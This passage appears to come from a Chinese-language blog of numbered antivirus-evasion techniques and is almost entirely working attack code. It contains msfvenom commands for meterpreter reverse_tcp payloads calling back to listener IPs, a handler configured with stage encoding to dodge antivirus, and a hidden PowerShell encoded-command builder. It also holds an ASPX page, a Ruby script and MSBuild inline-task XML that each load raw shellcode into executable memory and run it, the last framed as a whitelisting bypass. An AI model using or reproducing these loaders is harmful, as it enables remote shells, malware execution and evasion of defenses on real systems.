class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">encode_block</span><span class="params">(state, buf)</span></span></span><br><span class="line">		base64 = Rex::Text.encode_base64(Rex::Text.to_unicode(buf))</span><br><span class="line">		cmd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> datastore[<span class="string">&#x27;x64&#x27;</span>]</span><br><span class="line">			cmd += <span class="string">&#x27;c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe &#x27;</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			cmd += <span class="string">&#x27;powershell.exe &#x27;</span></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">		<span class="keyword">if</span> datastore[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">			cmd += <span class="string">&#x27;-windowstyle hidden -exec bypass -NoExit &#x27;</span></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">		cmd += <span class="string">&quot;-EncodedCommand <span class="subst">#&#123;base64&#125;</span>&quot;</span></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p><code>msfvenom</code>生成<code>Powershell</code>木马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.206.129 LPORT&#x3D;8888 -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell&#x2F;base64 --arch x64 --platform windows payload</span><br></pre></td></tr></table></figure>
<h2 id="66-借助aspx对payload进行分离免杀"><a href="#66-借助aspx对payload进行分离免杀" class="headerlink" title="66. 借助aspx对payload进行分离免杀"></a>66. 借助aspx对payload进行分离免杀</h2><ul>
<li>msf监听</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid</span><br><span class="line">set lhost 192.168.1.5</span><br><span class="line">set lport 53</span><br><span class="line">set stageencoder x86&#x2F;shikata_ga_nai  &#x2F;&#x2F;设置编码器</span><br><span class="line">set EnableStageEncoding true   &#x2F;&#x2F;尝试使用不同的编码器对stage进行编码，可能绕过部分杀软的查杀</span><br><span class="line">set exitonsession false   &#x2F;&#x2F;可以在接收到seesion后继续监听端口，保持侦听</span><br></pre></td></tr></table></figure>
<ul>
<li>msfvenom生成payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -p windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid LHOST&#x3D;192.168.1.5 LPORT&#x3D;53 EnableStageEncoding&#x3D;true stageencoder&#x3D;x86&#x2F;shikata_ga_nai -e x86&#x2F;shikata_ga_nai -i 5 -f csharp</span><br></pre></td></tr></table></figure>
<ul>
<li>分离免杀Code</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;C#&quot; AutoEventWireup&#x3D;&quot;true&quot; Inherits&#x3D;&quot;System.Web.UI.Page&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace&#x3D;&quot;System&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace&#x3D;&quot;System.Runtime.InteropServices&quot; %&gt;</span><br><span class="line">&lt;script runat&#x3D;&quot;server&quot;&gt;</span><br><span class="line">delegate int MsfpayloadProc();</span><br><span class="line">protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">    byte[] buf &#x3D; new byte[509] &#123;</span><br><span class="line">0xda,0xda,0xba,0xb0,0x17,0xa3,0xe9,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,</span><br><span class="line">0x79,0x31,0x50,0x19,0x03,0x50,0x19,0x83,0xc0,0x04,0x52,0xe2,0x1b,0x10,0x28,</span><br><span class="line">0x74,0x47,0x39,0x91,0x5e,0x03,0x99,0xdd,0x3b,0xdd,0x28,0xac,0xce,0x2c,0xe9,</span><br><span class="line">0xdb,0x2d,0x0d,0xf8,0x60,0xf3,0x95,0xe0,0x6a,0xf6,0x68,0x1d,0x67,0x0c,0xb7,</span><br><span class="line">0xe1,0xb7,0x79,0x45,0x29,0x28,0x22,0x81,0x57,0x25,0x78,0x6f,0x23,0x41,0x0a,</span><br><span class="line">0x6e,0x36,0xb6,0x07,0x89,0x46,0x67,0x00,0xaa,0x35,0x66,0x4a,0x0b,0x75,0x56,</span><br><span class="line">0x3c,0xfd,0x05,0x86,0x00,0x93,0xdc,0x73,0x7a,0xc5,0x3e,0x4f,0xe4,0xb8,0x21,</span><br><span class="line">0x01,0xc9,0xe6,0x24,0xc6,0x54,0xc5,0x85,0x44,0x50,0xec,0xf1,0x05,0x9f,0x59,</span><br><span class="line">0x85,0x3e,0xa8,0x6b,0x1e,0x0b,0x35,0x0e,0xab,0xfa,0x90,0xf4,0x52,0x4d,0x8d,</span><br><span class="line">0xf4,0x2c,0xb0,0xcb,0x72,0x75,0x71,0x87,0xcc,0x81,0x30,0x58,0x6c,0x2a,0xd3,</span><br><span class="line">0x82,0x1b,0x83,0x69,0x5c,0x84,0x0e,0xea,0x69,0x8c,0x7a,0xc3,0xd3,0xba,0x65,</span><br><span class="line">0x4c,0x06,0x38,0x1c,0x06,0x13,0x0d,0xf6,0xd0,0x8b,0xf3,0x35,0x0b,0x84,0x71,</span><br><span class="line">0x09,0x49,0x2a,0x7d,0xbe,0x13,0x76,0x0d,0x0a,0xca,0x34,0x83,0xa0,0xb2,0x2c,</span><br><span class="line">0x66,0x4f,0xd5,0x91,0x11,0xf9,0x92,0x6b,0x61,0xc6,0x7f,0xc2,0x7c,0x2d,0x3a,</span><br><span class="line">0xc3,0xc2,0x30,0x7e,0x0c,0x22,0x55,0x12,0x49,0xa7,0x5d,0x5f,0xe7,0x75,0x7d,</span><br><span class="line">0x89,0x0f,0xd2,0x51,0x4b,0x67,0x0f,0xbc,0x36,0xcc,0x46,0xd0,0x92,0x5a,0x50,</span><br><span class="line">0xe7,0x3b,0xed,0xb4,0xf4,0xba,0xc3,0xda,0x60,0x5e,0xde,0x4e,0xbc,0xce,0x0e,</span><br><span class="line">0x24,0xf1,0x5e,0xc0,0x92,0x9d,0xf6,0xe2,0x94,0xe8,0xef,0xb7,0x9b,0x43,0xec,</span><br><span class="line">0xb9,0xe6,0x3d,0xd1,0xc8,0xeb,0x54,0x23,0x24,0x55,0xb7,0x77,0x5f,0x28,0xb9,</span><br><span class="line">0xf5,0x80,0x12,0x11,0xaa,0x1d,0x0a,0xea,0xe0,0xb7,0xa8,0xc8,0xf5,0xfb,0xf2,</span><br><span class="line">0x90,0x4d,0xe8,0x7c,0xe6,0x6a,0x3b,0x60,0x1d,0xce,0x1a,0xdf,0x1c,0x46,0x6c,</span><br><span class="line">0x94,0xff,0x30,0x7a,0x99,0xdd,0x09,0x1e,0xb6,0xcf,0xe5,0x4f,0xfd,0x57,0x35,</span><br><span class="line">0xd1,0xf7,0xd8,0x96,0x16,0xf7,0x74,0xc2,0x91,0xcc,0x9d,0xa1,0xa9,0x94,0x97,</span><br><span class="line">0x5b,0xf6,0x90,0x1f,0x85,0x3c,0x5c,0xcc,0xf2,0x11,0x6c,0xdd,0x7b,0x8c,0x5d,</span><br><span class="line">0xa4,0xd3,0xe9,0x2c,0xa6,0xc9,0x06,0xa7,0x0e,0x54,0x41,0xac,0xf0,0xfc,0x30,</span><br><span class="line">0x16,0x49,0x5f,0x48,0x2d,0x19,0x33,0x83,0x2a,0x45,0x0a,0xfa,0xd6,0xba,0x72,</span><br><span class="line">0x76,0xbf,0xfd,0xce,0x4e,0xad,0x0e,0xc8,0xc9,0x20,0xb4,0x16,0x86,0xc4,0x72,</span><br><span class="line">0x74,0x5d,0x91,0x5a,0xcb,0xba,0xdf,0xe7,0xc7,0x07,0x96,0x51,0x15,0x8a,0xdf,</span><br><span class="line">0xff,0xc5,0x84,0x8e,0x59,0xfa,0x60,0x9f,0x74,0x85,0xdf,0xe8,0x77,0x50,0x03,</span><br><span class="line">0x61,0x0c,0xfe,0xad,0x28,0x16,0x3d,0x93,0xc8,0x6a,0x0b,0xda,0x20,0x7e,0xfa,</span><br><span class="line">0xa7,0xf3,0x9d,0x18,0x18,0x3a,0x98,0xe7,0xbc,0x4b,0x59,0x39,0xc6,0x9e,0xbb,</span><br><span class="line">0xa8,0xa7,0x7f,0xc6,0xa2,0x8a,0xc9,0x23,0x48,0x94,0xa3,0xd6,0x5a,0x6b,0x99,</span><br><span class="line">0xee,0x30,0x7f,0x6b,0x89,0xb3,0x62,0xd2,0x27,0xae,0xdb,0x37,0x9e,0x19,0xc1,</span><br><span class="line">0x42,0x30,0x98,0x1c,0xa2,0xe2,0x46,0x65,0xec,0x49,0xa9,0x27,0xc8,0x4b &#125;;</span><br><span class="line">    IntPtr handle &#x3D; IntPtr.Zero;</span><br><span class="line">    handle &#x3D; VirtualAlloc(</span><br><span class="line">        IntPtr.Zero,</span><br><span class="line">        codeBytes.Length,</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    try</span><br><span class="line">        &#123;</span><br><span class="line">            Marshal.Copy(codeBytes, 0, handle, codeBytes.Length);</span><br><span class="line">            MsfpayloadProc msfpayload &#x3D; Marshal.GetDelegateForFunctionPointer(handle, typeof(MsfpayloadProc)) as MsfpayloadProc;</span><br><span class="line">            msfpayload();</span><br><span class="line">        &#125;</span><br><span class="line">    finally</span><br><span class="line">        &#123;</span><br><span class="line">            VirtualFree(handle, 0, MEM_RELEASE);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    [DllImport(&quot;Kernel32.dll&quot;, EntryPoint &#x3D; &quot;VirtualAlloc&quot;)]</span><br><span class="line">    public static extern IntPtr VirtualAlloc(IntPtr address, int size, ui ntallocType, uint protect);</span><br><span class="line">    [DllImport(&quot;Kernel32.dll&quot;, EntryPoint &#x3D; &quot;VirtualFree&quot;)]</span><br><span class="line">    public static extern bool VirtualFree(IntPtr address, int size, uint freeType);</span><br><span class="line">    const uint MEM_COMMIT &#x3D; 0x1000;</span><br><span class="line">    const uint MEM_RESERVE &#x3D; 0x2000;</span><br><span class="line">    const uint PAGE_EXECUTE_READWRITE &#x3D; 0x40;</span><br><span class="line">    const uint MEM_RELEASE &#x3D; 0x8000;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="68-基于Ruby内存加载shellcode第一季"><a href="#68-基于Ruby内存加载shellcode第一季" class="headerlink" title="68. 基于Ruby内存加载shellcode第一季"></a>68. 基于Ruby内存加载shellcode第一季</h2><ul>
<li>msfvenom生成payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;messagebox TEXT&#x3D;Micropoor TITLE&#x3D;Micropoor ‐f ruby ‐‐smallest</span><br></pre></td></tr></table></figure>
<ul>
<li>编译ruby版shellcode</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/import&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/types&#x27;</span></span><br><span class="line"> </span><br><span class="line">shellcode =</span><br><span class="line"><span class="string">&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01&quot;</span> +</span><br><span class="line"><span class="string">&quot;\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span> Fiddle</span><br><span class="line"> </span><br><span class="line">kernel32 = Fiddle.dlopen(<span class="string">&#x27;kernel32&#x27;</span>)</span><br><span class="line">ptr = Function.new(kernel32[<span class="string">&#x27;VirtualAlloc&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, shellcode.size, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">Function.new(kernel32[<span class="string">&#x27;VirtualProtect&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(ptr, shellcode.size, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">buf = Fiddle::Pointer[shellcode]</span><br><span class="line"> </span><br><span class="line">Function.new(kernel32[<span class="string">&#x27;RtlMoveMemory&#x27;</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>], <span class="number">4</span>).call(ptr, buf, s</span><br><span class="line">hellcode.size)</span><br><span class="line">thread = Function.new(kernel32[<span class="string">&#x27;CreateThread&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>],<span class="number">4</span>).call(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">Function.new(kernel32[<span class="string">&#x27;WaitForSingleObject&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(thread,‐<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="71-基于白名单Msbuild-exe执行payload第一季"><a href="#71-基于白名单Msbuild-exe执行payload第一季" class="headerlink" title="71. 基于白名单Msbuild.exe执行payload第一季"></a>71. 基于白名单Msbuild.exe执行payload第一季</h2><ul>
<li>WIN 7 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>msfvenom生成shellcode</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.5.99 LPORT=10129 -f csharp</span><br></pre></td></tr></table></figure>
<ul>
<li>executes shellcode.xml</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion&#x3D;&quot;4.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;developer&#x2F;msbuild&#x2F;2003&quot;&gt;</span><br><span class="line">  &lt;!-- This inline task executes shellcode. --&gt;</span><br><span class="line">  &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;</span><br><span class="line">  &lt;!-- Save This File And Execute The Above Command --&gt;</span><br><span class="line">  &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt; </span><br><span class="line">  &lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line">  &lt;Target Name&#x3D;&quot;Hello&quot;&gt;</span><br><span class="line">    &lt;ClassExample &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">    </span><br><span class="line">      &lt;Code Type&#x3D;&quot;Class&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">        using System;</span><br><span class="line">        using System.Runtime.InteropServices;</span><br><span class="line">        using Microsoft.Build.Framework;</span><br><span class="line">        using Microsoft.Build.Utilities;</span><br><span class="line">        public class ClassExample :  Task, ITask</span><br><span class="line">        &#123;         </span><br><span class="line">          private static UInt32 MEM_COMMIT &#x3D; 0x1000;          </span><br><span class="line">          private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern IntPtr CreateThread(            </span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId           </span><br><span class="line">            );</span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );          </span><br><span class="line">          public override bool Execute()</span><br><span class="line">          &#123;</span><br><span class="line">            byte[] shellcode &#x3D; new byte[195] &#123;</span><br><span class="line">              0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,</span><br><span class="line">              0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,</span><br><span class="line">              0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,</span><br><span class="line">              0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,</span><br><span class="line">              0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,</span><br><span class="line">              0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,</span><br><span class="line">              0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,</span><br><span class="line">              0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,</span><br><span class="line">              0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,</span><br><span class="line">              0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,</span><br><span class="line">              0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,</span><br><span class="line">              0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,</span><br><span class="line">              0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 &#125;;</span><br><span class="line">              </span><br><span class="line">              UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">              IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">              UInt32 threadId &#x3D; 0;</span><br><span class="line">              IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line">              hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">              WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">              return true;</span><br><span class="line">          &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">  &lt;&#x2F;UsingTask&gt;</span><br><span class="line">&lt;&#x2F;Project&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>executes x64 shellcode.xml</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion&#x3D;&quot;4.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;developer&#x2F;msbuild&#x2F;2003&quot;&gt;</span><br><span class="line">  &lt;!-- This inline task executes x64 shellcode. --&gt;</span><br><span class="line">  &lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;</span><br><span class="line">  &lt;!-- Save This File And Execute The Above Command --&gt;</span><br><span class="line">  &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt; </span><br><span class="line">  &lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line">  &lt;Target Name&#x3D;&quot;Hello&quot;&gt;</span><br><span class="line">    &lt;ClassExample &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">    </span><br><span class="line">      &lt;Code Type&#x3D;&quot;Class&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">        using System;</span><br><span class="line">        using System.Runtime.InteropServices;</span><br><span class="line">        using Microsoft.Build.Framework;</span><br><span class="line">        using Microsoft.Build.Utilities;</span><br><span class="line">        public class ClassExample :  Task, ITask</span><br><span class="line">        &#123;         </span><br><span class="line">          private static UInt32 MEM_COMMIT &#x3D; 0x1000;          </span><br><span class="line">          private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern IntPtr CreateThread(            </span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId           </span><br><span class="line">            );</span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );          